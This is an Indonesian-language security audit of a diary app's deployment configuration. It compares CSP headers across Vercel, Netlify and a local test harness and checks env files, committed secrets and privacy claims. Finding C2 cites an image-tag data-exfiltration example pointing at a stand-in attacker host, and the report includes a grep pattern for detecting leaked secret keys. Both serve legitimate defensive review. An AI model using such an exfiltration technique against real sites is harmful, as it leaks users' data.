# 04 — Audit konfigurasi deploy

Peran: A4 (READ-ONLY). Branch: `apply/supabase-sync`. Tanggal: 2026-10-01.

## Ringkasan

- CSP deploy: `vercel.json` dan `netlify.toml` **IDENTIK byte-per-byte** (286 char). `connect-src` memuat `https://*.supabase.co wss://*.supabase.co` di **ketiga** file — invariant sync terpenuhi.
- `scripts/serve-with-csp.mjs` (harness lokal saja) **beda 1 directive**: tidak ada `upgrade-insecure-requests`. Beda ini sudah ada di HEAD, bukan dari perubahan sync. Bukan P0: yang di-deploy sudah identik.
- Tidak ada rahasia ter-commit. `.env.local` gitignored; `.env.example` hanya placeholder.
- Klaim privacy jujur: sync opsional, default off, teks menyesuaikan state.
- Temuan: **P0 = 0, P1 = 1, P2 = 3**.

## Tabel temuan

| ID | Masalah | file:baris | Bukti/dampak | P | Effort |
|---|---|---|---|---|---|
| C1 | CSP harness lokal tidak sama dengan header produksi: `upgrade-insecure-requests` hilang | `scripts/serve-with-csp.mjs:12-24` (idx 10 absen) | String penuh serve = 259 char vs 286 char deploy. Harness bisa PASS padahal header prod beda; menyalahi komentar file sendiri ("same security headers as vercel.json / netlify.toml"). Sudah ada di HEAD (`git show HEAD:...` juga absen). connect-src tetap identik | P1 | S |
| C2 | `img-src` membuka semua host https (`https:`) | `vercel.json:13`, `netlify.toml:28`, `serve-with-csp.mjs:17` | Dibenarkan fitur insert image by URL (`useEditorSetup.ts:97`) + avatar DiceBear. Risiko: exfil via `<img src=https://attacker/?x>` bila ada XSS. XSS surface kecil (script-src 'self', tanpa unsafe-inline/eval). Tradeoff terdokumentasi di netlify.toml | P2 | S |
| C3 | `.env.example` mendokumentasikan `VITE_APP_NAME` + `VITE_STORAGE_NAMESPACE` yang tidak dibaca di kode | `.env.example:5-6` | Tidak ada `import.meta.env.VITE_APP_NAME/VITE_STORAGE_NAMESPACE` di `src` (namespace hardcoded di `src/constants/storageKeys.ts:2`). Env mati = noise setup | P2 | S |
| C4 | Parity Node version: netlify pin 22, vercel tidak pin | `netlify.toml:6` vs `vercel.json` | netlify pin `NODE_VERSION="22"`; vercel pakai default host. README minta Node 18+. Bukan bug hari ini, tapi build bisa drift beda antar host | P2 | S |

Tidak ada P0.

## Diff CSP 3 tempat (eksplisit)

Hasil: **vercel.json == netlify.toml (IDENTIK)**. `scripts/serve-with-csp.mjs` **BEDA**.

```
vercel.json  len 286
netlify.toml len 286
serve.mjs    len 259
vercel===netlify: true
vercel===serve  : false
directive diff vercel vs serve:
  idx 10 | V/N: upgrade-insecure-requests | S: <absent>
```

- Semua directive lain (termasuk `connect-src 'self' https://*.supabase.co wss://*.supabase.co`) identik urut dan nilainya.
- Satu-satunya beda: `upgrade-insecure-requests` hanya ada di vercel + netlify.
- Beda ini **pre-existing**: `git show HEAD:vercel.json` dan `HEAD:netlify.toml` sama-sama punya directive itu, `HEAD:scripts/serve-with-csp.mjs` juga tidak. Perubahan sync tidak menambah/mengurangi directive apa pun selain `connect-src`.

## CSP correctness

- `connect-src` memuat `https://*.supabase.co` + `wss://*.supabase.co`: **ya**, di ketiga file. (Realtime belum dipakai kode saat ini — `wss:` belum load-bearing, tapi aman disiapkan.)
- Tidak ada `unsafe-eval`. Tidak ada `unsafe-inline` di `script-src` (hanya di `style-src`, wajib untuk Framer Motion). Tidak ada wildcard `script-src`.
- `object-src 'none'`, `base-uri 'self'`, `form-action 'none'`, `frame-ancestors 'none'`: keras dan benar.
- `img-src https:` lebar -> lihat C2.

## Env host & langkah setup

- `.env.example` mendokumentasikan **kedua** var: `VITE_SUPABASE_URL` (baris 15) dan `VITE_SUPABASE_ANON_KEY` (baris 16), keduanya dikomentari (opsional). Benar.
- README langkah setup sync lengkap: apply migration (`README.md:124`), tambah `{{ .Token }}` ke Confirm signup + Magic Link (`README.md:125`), set env di host + redeploy (`README.md:132`). Benar.
- Template lokal `supabase/templates/confirmation.html:3` dan `magic_link.html:3` sudah memuat `{{ .Token }}`. Konsisten.

## Klaim privacy

- `README.md:5` — "No account, no server, no tracking — unless you turn on optional sync ... uploads your entries to your own Supabase project." Jujur.
- `README.md:112-118` — Data and privacy: storage lokal + caveat backup. Jujur.
- `PrivacySection.tsx:14` — sync off: "Entries never leave this browser unless you export them yourself." (dipakai assertion `check-sync-removed.mjs:182`). `:16` signed in: menyatakan plain text + "readable by anyone with access". `:18` signed out: "nothing is uploaded while you are signed out." Jujur, tidak ada klaim "100% offline" saat sync aktif.
- Tidak ditemukan klaim enkripsi palsu; `:43` justru eksplisit "It does not encrypt them".

## netlify.toml

- SPA fallback `/* -> /index.html` status 200 (`:11-14`): benar, load-bearing untuk deep link.
- Header CSP (`:28`): benar, identik vercel.
- `NODE_VERSION = "22"` (`:6`): memenuhi Vite 5 (`^18 || >=20`). OK.
- Cache-Control `/assets/*` + `/fonts/*` immutable: benar (hash di nama file).

## vercel.json

- Rewrite SPA `/(.*) -> /index.html` (`:7`): benar untuk Vite SPA (static file disajikan filesystem dulu).
- Header CSP (`:13`): benar, identik netlify.
- Tidak ada pin Node (lihat C4).

## Rahasia

`git grep -nE "sb_publishable_|sb_secret_|eyJ[A-Za-z0-9_-]{20,}|service_role" -- . ':!*.md'` -> **clean**.
`git ls-files | grep -iE "^\.env"` -> hanya `.env.example`.
`.env.local` gitignored (`.gitignore:5`); isi nyata (anon key) tidak ter-commit.
`supabase/config.toml` (untracked) tidak memuat rahasia: pakai `env(...)` substitution, nilai sensitif dikomentari. `supabase/.gitignore` menutup `.env.local`/`.env.keys`.

## Output mentah

### grep CSP

```
vercel.json:12:          "key": "Content-Security-Policy",
scripts/serve-with-csp.mjs:7: * Content-Security-Policy can be tested against the real bundle instead of assumed.
scripts/serve-with-csp.mjs:45:        'Content-Security-Policy': CSP,
netlify.toml:28:    Content-Security-Policy = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data: https:; connect-src 'self' https://*.supabase.co wss://*.supabase.co; object-src 'none'; base-uri 'self'; form-action 'none'; frame-ancestors 'none'; upgrade-insecure-requests"
```

### vercel.json

```json
{
  "$schema": "https://openapi.vercel.sh/vercel.json",
  "framework": "vite",
  "buildCommand": "npm run build",
  "outputDirectory": "dist",
  "rewrites": [{ "source": "/(.*)", "destination": "/index.html" }],
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data: https:; connect-src 'self' https://*.supabase.co wss://*.supabase.co; object-src 'none'; base-uri 'self'; form-action 'none'; frame-ancestors 'none'; upgrade-insecure-requests"
        },
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
        { "key": "Permissions-Policy", "value": "camera=(), microphone=(), geolocation=(), payment=()" }
      ]
    },
    {
      "source": "/assets/(.*)",
      "headers": [{ "key": "Cache-Control", "value": "public, max-age=31536000, immutable" }]
    },
    {
      "source": "/fonts/(.*)",
      "headers": [{ "key": "Cache-Control", "value": "public, max-age=31536000, immutable" }]
    }
  ]
}
```

### netlify.toml

```toml
[build]
  command = "npm run build"
  publish = "dist"

[build.environment]
  # Vite 5 requires ^18 || >=20. Pin it so a Netlify default change cannot break the build.
  NODE_VERSION = "22"

# Client-side routing: every path must serve index.html or deep links 404.
[[redirects]]
  from = "/*"
  to = "/index.html"
  status = 200

# Security headers, kept identical to vercel.json so both hosts behave the same.
#
# script-src 'self' with no 'unsafe-inline' is what stops an inline handler in an
# imported backup from running. The bundle contains no eval and no new Function, so
# 'unsafe-eval' is not needed.
# style-src needs 'unsafe-inline' because Framer Motion writes style attributes.
# Fonts are self-hosted, so font-src is 'self' with no third-party origin.
# img-src allows any https host because inserting an image by URL is a feature.
# connect-src adds the Supabase project origin, and its Realtime websocket, for the optional
# cloud sync. Only *.supabase.co is opened; leaving sync unset means those hosts are unused.
[[headers]]
  for = "/*"
  [headers.values]
    Content-Security-Policy = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data: https:; connect-src 'self' https://*.supabase.co wss://*.supabase.co; object-src 'none'; base-uri 'self'; form-action 'none'; frame-ancestors 'none'; upgrade-insecure-requests"
    X-Frame-Options = "DENY"
    X-Content-Type-Options = "nosniff"
    Referrer-Policy = "strict-origin-when-cross-origin"
    Permissions-Policy = "camera=(), microphone=(), geolocation=(), payment=()"

# Fonts and content-hashed assets are safe to cache forever.
[[headers]]
  for = "/assets/*"
  [headers.values]
    Cache-Control = "public, max-age=31536000, immutable"

[[headers]]
  for = "/fonts/*"
  [headers.values]
    Cache-Control = "public, max-age=31536000, immutable"
```

### scripts/serve-with-csp.mjs (array CSP)

```js
const CSP = [
  "default-src 'self'",
  "script-src 'self'",
  "style-src 'self' 'unsafe-inline'",
  "font-src 'self'",
  "img-src 'self' data: https:",
  // The Supabase project origin, plus its Realtime websocket, for the optional cloud sync.
  "connect-src 'self' https://*.supabase.co wss://*.supabase.co",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'none'",
  "frame-ancestors 'none'",
].join('; ');
```

### .env.example

```
# Local environment variables for DearDiary.
# Copy this file to `.env` and adjust if needed. All values are optional: the app runs
# with none of them set.

VITE_APP_NAME=DearDiary
VITE_STORAGE_NAMESPACE=deardiary

# Optional cloud sync between devices. Both values come from a Supabase project
# (Project Settings > API). Leave them unset to keep the diary local-only: the Account
# section is not rendered and nothing reaches the network.
#
# The anon key is public by design; row-level security in supabase/migrations is what
# protects the data. Also apply that migration and add `{{ .Token }}` to both the Confirm signup
# and Magic Link email templates, or the one-time sign-in code will not arrive for all users.
# VITE_SUPABASE_URL=https://your-project.supabase.co
# VITE_SUPABASE_ANON_KEY=your-anon-key
```

### privacy grep

```
src/pages/Settings/sections/PrivacySection.tsx:14:  if (!syncEnabled()) return 'Entries never leave this browser unless you export them yourself.';
src/pages/Settings/sections/PrivacySection.tsx:16:    return 'Sync is on: entries are stored on this device and uploaded to your account as plain text, readable by anyone with access to that project.';
src/pages/Settings/sections/PrivacySection.tsx:18:  return 'Entries stay in this browser until you sign in. Sync is available in this build, but nothing is uploaded while you are signed out.';
src/pages/Settings/sections/PrivacySection.tsx:43:        This hides private entries from the app's own screens. It does not encrypt them: ...
README.md:3:An offline-first digital diary ...
README.md:5:Everything is stored in the browser by default. No account, no server, no tracking — unless you turn on optional sync (see below) ...
README.md:121:Cross-device sync is off until you configure it. With no configuration the app is local-only ...
```

### secrets scan

```
$ git grep -nE "sb_publishable_|sb_secret_|eyJ[A-Za-z0-9_-]{20,}|service_role" -- . ':!*.md'
clean
$ git ls-files | grep -iE "^\.env"
.env.example
```

## Handoff

- C1 (P1) satu baris: tambah `"upgrade-insecure-requests"` ke array CSP di `scripts/serve-with-csp.mjs` (setelah `frame-ancestors 'none'`). Tujuan: harness byte-identik dengan header deploy. Effort S.
- C3 (P2): hapus `VITE_APP_NAME` / `VITE_STORAGE_NAMESPACE` dari `.env.example` ATAU wire ke kode. Pilihan: hapus (namespace hardcoded). Effort S.
- C4 (P2): opsional tambah pin Node di vercel (mis. `"engines": { "node": ">=20" }` di package.json atau setting host) untuk parity dengan netlify.
- C2 (P2): tradeoff diterima, tidak perlu ubah kecuali mau perkecil `img-src` ke host tertentu.

## Catatan

- Tidak ada P0.
- Invariant `connect-src` (bagian yang load-bearing untuk sync) terpenuhi IDENTIK di ketiga file. Beda C1 hanya pada directive `upgrade-insecure-requests` di harness lokal, sudah ada sebelum perubahan sync.
